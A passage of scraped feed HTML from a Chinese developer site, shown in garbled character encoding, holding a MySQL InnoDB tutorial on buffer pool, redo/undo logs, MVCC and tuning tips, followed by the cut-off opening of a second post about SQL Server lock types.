            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/893244690677165/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æŠ€æœ¯ä¸æ‰“çƒŠ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T11:00:01.000Z" title="Fri Jan 02 2026 11:00:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eeafb70904254eb59d8ac0f458bd102e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv5LiN5omT54OK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767956401&amp;x-signature=76hROktUhZ5sBCezO5Uecr1FG3g%3D" alt="1.png" loading="lazy"/>
WHAAAATï¼Œä½ çš„çº¿ä¸ŠæŸ¥è¯¢çªç„¶ä» 50ms é£™åˆ° 5 ç§’ï¼ŸDBA ç”©è¿‡æ¥ä¸€å¥"ç¼“å†²æ± å‘½ä¸­ç‡æ‰ 60%"å°±èµ°äº†ï¼Œä½ ä¸€è„¸æ‡µï¼šè¿™ç©æ„å„¿åˆ°åº•å•¥åŸç†ï¼Ÿä¸ºå•¥èƒ½æŠŠæ€§èƒ½æ‹–å®æˆè¿™æ ·ï¼Ÿ</p>
<p>æ•°æ®ä¸ä¼šæ’’è° ã€‚MySQL å®˜æ–¹æ–‡æ¡£æ˜¾ç¤ºï¼Œ<strong>ç¼“å†²æ± å‘½ä¸­ç‡ä» 95% è·Œåˆ° 60%ï¼Œæ„å‘³ç€æ¯ 10 æ¬¡æŸ¥è¯¢å°±æœ‰ 4 æ¬¡è¦è¯»ç£ç›˜</strong>â€”â€”å†…å­˜è®¿é—®è€—æ—¶ 100 çº³ç§’ï¼Œç£ç›˜ IO å´è¦ 10 æ¯«ç§’ï¼Œè¿™æ˜¯ 10 ä¸‡å€çš„æ€§èƒ½é¸¿æ²Ÿ ã€‚é—®é¢˜æ¥äº†ï¼Œä¸ºä»€ä¹ˆå¤§å‚ DBA éƒ½åœ¨æ­»ç£• InnoDB çš„ä¸‰å¤§æœºåˆ¶ï¼šç¼“å†²æ± ã€äº‹åŠ¡æ—¥å¿—ã€MVCCï¼Ÿå› ä¸ºè¿™ä¸‰ä¸ªç»„ä»¶çš„ååŒé€»è¾‘ï¼Œç›´æ¥å†³å®šäº† MySQL èƒ½ä¸èƒ½æ‰›ä½é«˜å¹¶å‘ã€‚</p>
<h2 data-id="heading-0">ç¼“å†²æ± ï¼šå†…å­˜å’Œç£ç›˜çš„ç”Ÿæ­»è¾ƒé‡</h2>
<p>ä¸ºä»€ä¹ˆ MySQL ä¸ç›´æ¥è¯»ç£ç›˜ï¼Ÿç­”æ¡ˆè—åœ¨ä¸€ä¸ª 16KB çš„"é¡µ"é‡Œ ã€‚InnoDB æŠŠæ•°æ®æŒ‰ 16KB ä¸ºå•ä½ç»„ç»‡æˆé¡µï¼ˆPageï¼‰ï¼Œç¼“å†²æ± çš„æœ¬è´¨å°±æ˜¯æŠŠè¿™äº›çƒ­ç‚¹æ•°æ®é¡µç¼“å­˜åœ¨å†…å­˜é‡Œ ã€‚ä»€ä¹ˆæ¦‚å¿µï¼Ÿå‡è®¾ä½ æŸ¥ä¸€æ¡ç”¨æˆ·è®°å½•ï¼Œæ²¡æœ‰ç¼“å†²æ± çš„è¯ï¼ŒMySQL è¦å»ç£ç›˜ä¸Šææ•°æ®ï¼Œè€—æ—¶ 10msï¼›æœ‰ç¼“å†²æ± ç›´æ¥å†…å­˜è¯»å–ï¼Œåªè¦ 0.1msâ€”â€”<strong>æ€§èƒ½å·®äº† 100 å€</strong> ã€‚</p>
<p>ä½†çœŸæ­£çš„ç²¾é«“åœ¨æ”¹è¿›ç‰ˆ LRU ç®—æ³• ã€‚ä¼ ç»Ÿ LRUï¼ˆæœ€è¿‘æœ€å°‘ä½¿ç”¨ï¼‰æœ‰ä¸ªè‡´å‘½é—®é¢˜ï¼šä¸€æ¬¡å…¨è¡¨æ‰«æå°±èƒ½æŠŠç¼“å­˜"æ±¡æŸ“"å¹²å‡€ã€‚InnoDB æ€ä¹ˆç ´ï¼Ÿ<strong>æŠŠ LRU é“¾è¡¨åˆ‡æˆä¸¤æˆªï¼šyoung åŒºï¼ˆæ–°æ•°æ®åŒºï¼‰å’Œ old åŒºï¼ˆè€æ•°æ®åŒºï¼‰</strong>ã€‚æ–°è¯»å…¥çš„é¡µå…ˆæ‰”åˆ° old åŒºï¼Œåªæœ‰è¢«å†æ¬¡è®¿é—®æ‰èƒ½æ™‹å‡åˆ° young åŒº ã€‚è¿™æ‹›å¤ªç»äº†â€”â€”æ‰«æå‡ ç™¾ä¸‡è¡Œçš„ä¸´æ—¶æ•°æ®ï¼Œæœ€å¤šå ç”¨ 3/8 çš„ old åŒºï¼Œæ ¸å¿ƒçƒ­ç‚¹æ•°æ®ç¨³ç¨³å¾…åœ¨ young åŒºä¸å—å¹²æ‰°ã€‚</p>
<p>é…ç½®å»ºè®®ï¼Ÿè¡Œä¸šå…±è¯†æ˜¯<strong>ç‰©ç†å†…å­˜çš„ 70-80%</strong> ã€‚ä½† Percona çš„å·¥ç¨‹å¸ˆè·³å‡ºæ¥æ‰“è„¸ï¼šå¯¹äº 1TB å†…å­˜çš„å¤§æœåŠ¡å™¨ï¼ŒæŒ‰ 80% è§„åˆ™åˆ†é… 820GB ç»™ç¼“å†²æ± ï¼Ÿæ‰¯æ·¡ï¼å®é™…å…¬å¼æ˜¯ <strong>(æ€»å†…å­˜ - 7GB) Ã— 0.9</strong> ã€‚64GB çš„æœºå™¨ï¼Œç¼“å†²æ± è®¾åˆ° 51GB å°±å¤Ÿäº†â€”â€”å‰©ä¸‹çš„å†…å­˜è¦ç•™ç»™è¿æ¥ç®¡ç†ã€æŸ¥è¯¢æ’åºã€æ“ä½œç³»ç»Ÿç¼“å­˜ï¼ˆä»Šå¹´å¤§å®¶éƒ½åœ¨ç©äº‘åŸç”Ÿï¼Œå†…å­˜è¶…åˆ†å¯å¤ªå¸¸è§äº†ï¼‰ã€‚[^4][^5]</p>
<h2 data-id="heading-1">Redo Logï¼šå´©æºƒæ¢å¤çš„æ•‘å‘½ç¨»è‰</h2>
<p>**MySQL å¦‚ä½•åšåˆ°"å®•æœºä¹Ÿä¸ä¸¢æ•°æ®"ï¼Ÿ**ç§˜å¯†è—åœ¨ WALï¼ˆWrite-Ahead Loggingï¼‰æœºåˆ¶é‡Œ ã€‚ç®€å•æ¥è¯´å°±æ˜¯ï¼š<strong>å…ˆå†™æ—¥å¿—ï¼Œå†åˆ·æ•°æ®</strong> ã€‚å½“ä½ æ‰§è¡Œä¸€æ¡ UPDATE è¯­å¥ï¼ŒInnoDB ä¸ä¼šå‚»ä¹ä¹ç«‹åˆ»æŠŠè„é¡µåˆ·åˆ°ç£ç›˜ï¼ˆéšæœº IO å¤ªæ…¢äº†ï¼‰ï¼Œè€Œæ˜¯å…ˆæŠŠä¿®æ”¹è®°å½•å†™å…¥ Redo Logï¼Œäº‹åŠ¡å°±ç®—æäº¤æˆåŠŸ ã€‚</p>
<p>å•§å•§ï¼Œè¿™é€»è¾‘å¬ç€åƒ"ç©ºæ‰‹å¥—ç™½ç‹¼"ï¼Ÿä½†æ•°å­¦ä¸ä¼šéª—äººã€‚Redo Log æ˜¯<strong>é¡ºåºå†™</strong>ï¼Œä¸€ç§’èƒ½å†™å‡ åƒæ¬¡ï¼›æ•°æ®é¡µåˆ·ç›˜æ˜¯<strong>éšæœºå†™</strong>ï¼Œå¯èƒ½åªæœ‰å‡ ç™¾æ¬¡ ã€‚ä¸‡ä¸€æœåŠ¡å™¨çªç„¶æ–­ç”µï¼Œé‡å¯å MySQL è¯»å– Redo Logï¼ŒæŠŠæœªåˆ·ç›˜çš„æ•°æ®é¡µæ¢å¤å›æ¥â€”â€”è¿™å°±æ˜¯å´©æºƒæ¢å¤ï¼ˆCrash Recoveryï¼‰çš„å®Œæ•´é“¾è·¯ ã€‚</p>
<p>å…³é”®å‚æ•° <code>innodb_flush_log_at_trx_commit</code> æœ‰ä¸‰æ¡£è®¾ç½® ï¼š</p>
<ul>
<li><strong>è®¾æˆ 1ï¼ˆé»˜è®¤ï¼‰</strong>ï¼šæ¯æ¬¡äº‹åŠ¡æäº¤éƒ½åˆ·ç›˜ï¼Œæœ€å®‰å…¨ä½†æ€§èƒ½æœ€ä½</li>
<li><strong>è®¾æˆ 2</strong>ï¼šæ¯ç§’åˆ·ä¸€æ¬¡ç›˜ï¼Œæ€§èƒ½é£™å‡ä½†å®•æœºå¯èƒ½ä¸¢ 1 ç§’æ•°æ®</li>
<li><strong>è®¾æˆ 0</strong>ï¼šå†™åˆ°å†…å­˜å°±è¿”å›ï¼Œæœ€å¿«ä½†é£é™©æœ€é«˜</li>
</ul>
<p>ä»€ä¹ˆæ¦‚å¿µï¼Ÿä» 1 æ”¹æˆ 2ï¼Œå†™å…¥ QPS èƒ½ç¿»å€ ã€‚ä½†ä»£ä»·æ˜¯æ–­ç”µç¬é—´ï¼Œé‚£äº›è¿˜åœ¨å†…å­˜é‡Œçš„äº‹åŠ¡å°±æ°¸ä¹…è’¸å‘äº† ã€‚<strong>é‡‘èç³»ç»Ÿæ­»ç£• 1ï¼Œæ—¥å¿—ç±»ä¸šåŠ¡ç”¨ 2ï¼Œä½ å¾—æ ¹æ®ä¸šåŠ¡å±æ€§é€‰</strong> ã€‚</p>
<p>Undo Log æ˜¯å¦ä¸€æ¡æš—çº¿ ã€‚å®ƒä¸ä»…è´Ÿè´£äº‹åŠ¡å›æ»šï¼ˆæ‰§è¡Œå¤±è´¥æ—¶è¿˜åŸç°åœºï¼‰ï¼Œæ›´æ˜¯ MVCC å®ç°çš„åŸºç¡€â€”â€”<strong>é€šè¿‡ Undo Log ä¸²èµ·æ¥çš„å†å²ç‰ˆæœ¬é“¾ï¼ŒMySQL æ‰èƒ½è®©è¯»æ“ä½œä¸åŠ é”</strong> ã€‚</p>
<h2 data-id="heading-2">MVCCï¼šè¯»å†™ä¸é˜»å¡çš„é»‘é­”æ³•</h2>
<p>**ä¸ºä»€ä¹ˆ SELECT ä¸éœ€è¦åŠ é”ï¼Ÿ**è¿™æ˜¯ InnoDB æœ€éªšçš„è®¾è®¡ã€‚ä¼ ç»Ÿæ•°æ®åº“è¦ä¹ˆè¯»åŠ é”ï¼ˆé˜»å¡å†™ï¼‰ï¼Œè¦ä¹ˆå†™åŠ é”ï¼ˆé˜»å¡è¯»ï¼‰ï¼ŒMVCCï¼ˆå¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼‰ç›´æ¥æ€æ¡Œï¼š<strong>æ¯æ¡è®°å½•å­˜å¤šä¸ªç‰ˆæœ¬ï¼Œè¯»æ—§ç‰ˆæœ¬ã€å†™æ–°ç‰ˆæœ¬ï¼Œäº’ä¸å¹²æ‰°</strong> ã€‚</p>
<p>ä¸‰ä¸ªæ ¸å¿ƒç»„ä»¶æ’‘èµ·æ•´å¥—æœºåˆ¶ ï¼š</p>
<ul>
<li><strong>éšè—åˆ—</strong>ï¼šæ¯è¡Œè®°å½•å¸¦ä¸¤ä¸ªéšè—å­—æ®µâ€”â€”trx_idï¼ˆåˆ›å»ºè¯¥ç‰ˆæœ¬çš„äº‹åŠ¡ IDï¼‰å’Œ roll_pointerï¼ˆæŒ‡å‘ Undo Log é‡Œçš„æ—§ç‰ˆæœ¬ï¼‰</li>
<li><strong>Undo Log</strong>ï¼šå­˜å‚¨å†å²ç‰ˆæœ¬æ•°æ®ï¼Œé€šè¿‡ roll_pointer ä¸²æˆé“¾è¡¨</li>
<li><strong>Read View</strong>ï¼šäº‹åŠ¡å¯åŠ¨æ—¶ç”Ÿæˆçš„"å¿«ç…§"ï¼Œå†³å®šèƒ½çœ‹åˆ°å“ªäº›ç‰ˆæœ¬</li>
</ul>
<p>æ•¢æƒ…è¿™å°±æ˜¯ç‰ˆæœ¬é“¾çš„ç²¾é«“ï¼äº‹åŠ¡ A åœ¨æ”¹æ•°æ®æ—¶ï¼Œäº‹åŠ¡ B è¯»å–çš„æ˜¯æ—§ç‰ˆæœ¬ï¼ˆé€šè¿‡ roll_pointer å›æº¯ Undo Logï¼‰ï¼Œä¸¤è¾¹å®Œå…¨ä¸å†²çª ã€‚ä½†"å¿«ç…§è¯»"å’Œ"å½“å‰è¯»"å·®åˆ«å·¨å¤§ï¼š</p>
<ul>
<li><strong>å¿«ç…§è¯»ï¼ˆæ™®é€š SELECTï¼‰</strong>ï¼šè¯»å†å²ç‰ˆæœ¬ï¼Œä¸åŠ é”</li>
<li><strong>å½“å‰è¯»ï¼ˆSELECT FOR UPDATEï¼‰</strong>ï¼šè¯»æœ€æ–°ç‰ˆæœ¬ï¼Œå¿…é¡»åŠ é”</li>
</ul>
<p>MySQL é»˜è®¤éš”ç¦»çº§åˆ«æ˜¯ <strong>RRï¼ˆå¯é‡å¤è¯»ï¼‰</strong> è€Œé RCï¼ˆè¯»å·²æäº¤ï¼‰ï¼Œæ ¸å¿ƒåŸå› åœ¨ Read View ç”Ÿæˆæ—¶æœº ï¼š</p>
<ul>
<li><strong>RC æ¨¡å¼</strong>ï¼šæ¯æ¬¡æŸ¥è¯¢éƒ½ç”Ÿæˆæ–° Read Viewï¼Œèƒ½çœ‹åˆ°å…¶ä»–äº‹åŠ¡å·²æäº¤çš„ä¿®æ”¹</li>
<li><strong>RR æ¨¡å¼</strong>ï¼šäº‹åŠ¡å¼€å§‹æ—¶ç”Ÿæˆå”¯ä¸€ Read Viewï¼Œæ•´ä¸ªäº‹åŠ¡æœŸé—´çœ‹åˆ°çš„æ•°æ®ä¿æŒä¸€è‡´</li>
</ul>
<p>ä»€ä¹ˆæ¦‚å¿µï¼Ÿåœ¨ RR éš”ç¦»çº§åˆ«ä¸‹ï¼Œä½ ç¬¬ä¸€æ¬¡æŸ¥è¯¢çœ‹åˆ°ä½™é¢ 100 å…ƒï¼Œå°±ç®—åˆ«çš„äº‹åŠ¡æŠŠä½™é¢æ”¹æˆ 200 å…ƒå¹¶æäº¤äº†ï¼Œä½ è¿™ä¸ªäº‹åŠ¡é‡Œå†æŸ¥è¿˜æ˜¯ 100 å…ƒâ€”â€”è¿™å«"å¯é‡å¤è¯»" ã€‚ä½†ä»£ä»·æ˜¯å¯èƒ½å‡ºç°å¹»è¯»ï¼ˆå…¶ä»–äº‹åŠ¡æ’å…¥æ–°è¡Œï¼‰ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆ InnoDB è¿˜å¾—é é—´éš™é”æ¥è¡¥åˆ€ã€‚</p>
<h2 data-id="heading-3">ä»åŸç†åˆ°å®æˆ˜ï¼šå®Œæ•´ç”Ÿå‘½å‘¨æœŸ</h2>
<p>æŠŠä¸‰å¤§æœºåˆ¶ä¸²èµ·æ¥çœ‹ï¼Œä¸€æ¡ <code>UPDATE users SET balance = 200 WHERE id = 1</code> åˆ°åº•ç»å†äº†å•¥ï¼Ÿ</p>
<ol>
<li><strong>æ‰§è¡Œå™¨å¯åŠ¨</strong>ï¼šå…ˆå»ç¼“å†²æ± æ‰¾ id=1 çš„æ•°æ®é¡µï¼Œå‘½ä¸­ç›´æ¥è¯»å–ï¼Œæœªå‘½ä¸­å°±ä»ç£ç›˜åŠ è½½è¿›ç¼“å†²æ± </li>
<li><strong>å†™ Undo Log</strong>ï¼šæŠŠæ—§ç‰ˆæœ¬ï¼ˆbalance=100ï¼‰å†™å…¥ Undo Logï¼Œç”Ÿæˆ roll_pointer æŒ‡é’ˆ</li>
<li><strong>æ›´æ–°æ•°æ®é¡µ</strong>ï¼šåœ¨ç¼“å†²æ± é‡ŒæŠŠ balance æ”¹æˆ 200ï¼Œæ ‡è®°ä¸ºè„é¡µï¼Œæ­¤æ—¶<strong>æ•°æ®è¿˜æ²¡åˆ·ç›˜</strong></li>
<li><strong>å†™ Redo Log</strong>ï¼šæŠŠ"å°† id=1 çš„ balance æ”¹æˆ 200"è¿™æ¡æ“ä½œè®°å½•åˆ° Redo Log</li>
<li><strong>æäº¤äº‹åŠ¡</strong>ï¼šæ ¹æ® <code>innodb_flush_log_at_trx_commit</code> å†³å®šä½•æ—¶åˆ·ç›˜ï¼Œäº‹åŠ¡æäº¤å®Œæˆ</li>
</ol>
<p>æ•´ä¸ªé“¾è·¯ä¸‹æ¥ï¼Œç£ç›˜åªå†™äº†ä¸€æ¬¡ Redo Logï¼ˆé¡ºåºå†™ï¼‰ï¼Œæ•°æ®é¡µçš„éšæœºå†™è¢«å»¶ååˆ°åå°åˆ·è„é¡µçº¿ç¨‹æ…¢æ…¢å¤„ç† ã€‚<strong>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ InnoDB èƒ½æ‰›ä½æ¯ç§’ä¸Šä¸‡æ¬¡å†™å…¥</strong> ã€‚</p>
<p>æ€§èƒ½ä¼˜åŒ–çš„äº”æ¡é“å¾‹ï¼š</p>
<ul>
<li><strong>ç¼“å†²æ± åˆ«å°æ°”</strong>ï¼šä¸“ç”¨æ•°æ®åº“æœåŠ¡å™¨ï¼Œç›´æ¥è®¾åˆ°ç‰©ç†å†…å­˜çš„ 75%ï¼ˆå°äº 64GB æœºå™¨ï¼‰æˆ–ç”¨ (RAM - 7GB) Ã— 0.9 å…¬å¼[^4]</li>
<li><strong>æ—¥å¿—åˆ·ç›˜çœ‹åœºæ™¯</strong>ï¼šéé‡‘èä¸šåŠ¡å¯ä»¥æŠŠ <code>innodb_flush_log_at_trx_commit</code> æ”¹æˆ 2ï¼Œæ€§èƒ½ç¿»å€</li>
<li><strong>é¿å…é•¿äº‹åŠ¡</strong>ï¼šäº‹åŠ¡å¼€å¯è¶…è¿‡ 10 åˆ†é’Ÿï¼ŒUndo Log è†¨èƒ€ä¼šæ‹–å®æ•´ä¸ªç³»ç»Ÿ</li>
<li><strong>ç›‘æ§å‘½ä¸­ç‡</strong>ï¼šç¼“å†²æ± å‘½ä¸­ç‡ä½äº 95%ï¼Œç«‹åˆ»æ£€æŸ¥æ˜¯ä¸æ˜¯æœ‰å…¨è¡¨æ‰«æåœ¨"æ±¡æŸ“"ç¼“å­˜</li>
<li><strong>æ‹†åˆ†å¤§æŸ¥è¯¢</strong>ï¼šå•æ¬¡æ‰«æè¶…è¿‡ 10 ä¸‡è¡Œï¼Œè€ƒè™‘åŠ ç´¢å¼•æˆ–æ”¹ä¸šåŠ¡é€»è¾‘</li>
</ul>
<p>çœŸå®æ¡ˆä¾‹ï¼šæŸç”µå•†å…¬å¸é‡åˆ°æ…¢æŸ¥è¯¢ï¼Œå‘ç°ç¼“å†²æ± å‘½ä¸­ç‡åªæœ‰ 60% ã€‚æ’æŸ¥åå‘ç°æ˜¯æŠ¥è¡¨ä»»åŠ¡æ¯å°æ—¶è·‘ä¸€æ¬¡å…¨è¡¨æ‰«æï¼ŒæŠŠæ ¸å¿ƒäº¤æ˜“æ•°æ®å…¨æŒ¤å‡ºç¼“å­˜äº†ã€‚è§£å†³æ–¹æ¡ˆï¼Ÿç»™æŠ¥è¡¨æŸ¥è¯¢å•ç‹¬åˆ†é…ä»åº“ï¼Œä¸»åº“ç¼“å†²æ± å‘½ä¸­ç‡ç«‹åˆ»é£™å› 98%ï¼ŒæŸ¥è¯¢è€—æ—¶ä» 5 ç§’é™åˆ° 50msã€‚</p>
<hr/>
<p>InnoDB çš„é«˜æ€§èƒ½ä¸æ˜¯é­”æ³•ï¼Œè€Œæ˜¯ç¼“å†²æ± ã€Redo Logã€MVCC ä¸‰å¤§æœºåˆ¶ç²¾å¯†åä½œçš„ç»“æœã€‚<strong>æ‡‚åŸç†å’Œä¼šç”¨å‘½ä»¤ï¼Œå·®çš„æ˜¯åå€è°ƒä¼˜æ•ˆç‡</strong>ã€‚ç°åœ¨å»æ£€æŸ¥ä½ çš„ <code>innodb_buffer_pool_size</code> æ˜¯å¤šå°‘ï¼Ÿç”¨ <code>SHOW ENGINE INNODB STATUS</code> çœ‹çœ‹ç¼“å†²æ± å‘½ä¸­ç‡ï¼ŸæŠŠ <code>EXPLAIN</code> ç»“æœè´´å‡ºæ¥ï¼Œå’±ä»¬è¯„è®ºåŒºä¸€èµ·åˆ†ææ…¢æŸ¥è¯¢åˆ°åº•å¡åœ¨å“ªå„¿ã€‚</p>
<p>ä½ è¿˜æƒ³æ·±æŒ– InnoDB çš„å“ªäº›é»‘ç§‘æŠ€ï¼Ÿç´¢å¼•åº•å±‚çš„ B+ æ ‘å®ç°ï¼Ÿé”æœºåˆ¶é‡Œçš„é—´éš™é”å’Œä¸´é”®é”ï¼Ÿç•™è¨€å‘Šè¯‰æˆ‘ï¼Œä¸‹æœŸå®‰æ’ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SQL Server å®Œæ•´é”ç±»å‹è¯¦è§£]]></title>    <link>https://juejin.cn/post/7590071125398503464</link>    <guid>https://juejin.cn/post/7590071125398503464</guid>    <pubDate>2026-01-02T11:16:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590071125398503464" data-draft-id="7590054976489685032" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SQL Server å®Œæ•´é”ç±»å‹è¯¦è§£"/> <meta itemprop="keywords" content="æ•°æ®åº“"/> <meta itemprop="datePublished" content="2026-01-02T11:16:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§å·¨å¤´"/> <meta itemprop="url" content="https://juejin.cn/user/3993841710667752"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SQL Server å®Œæ•´é”ç±»å‹è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3993841710667752/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§å·¨å¤´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T11:16:57.000Z" title="Fri Jan 02 2026 11:16:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
